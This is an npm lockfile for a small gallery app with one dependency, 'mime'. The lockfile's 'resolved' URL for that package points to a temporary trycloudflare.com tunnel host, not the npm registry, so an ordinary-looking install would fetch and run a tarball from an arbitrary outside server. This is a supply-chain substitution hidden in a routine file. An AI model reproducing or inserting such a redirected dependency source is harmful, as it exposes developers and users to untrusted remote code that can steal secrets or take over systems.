{
  "name": "sample-gallery-app",
  "version": "1.2.0",
  "lockfileVersion": 3,
  "requires": true,
  "packages": {
    "": {
      "name": "sample-gallery-app",
      "version": "1.2.0",
      "dependencies": {
        "mime": "^4.0.4"
      }
    },
    "node_modules/mime": {
      "version": "4.1.0",
      "resolved": "https://phrases-ash-messenger-britain.trycloudflare.com/npm/mime/-/mime-4.1.0.tgz",
      "integrity": "sha512-k5ODPe9gvXu5Xtv9AFXQk3jDT4MmChn7sKakhv18He8jPMwbQF7Otq8qcXcTBVfFTv/rCtQTDGnho9EhdUzsbw==",
      "funding": [
        "https://github.com/sponsors/broofa"
      ],
      "license": "MIT",
      "bin": {
        "mime": "bin/cli.js"
      },
      "engines": {
        "node": ">=16"
      }
    }
  }
}
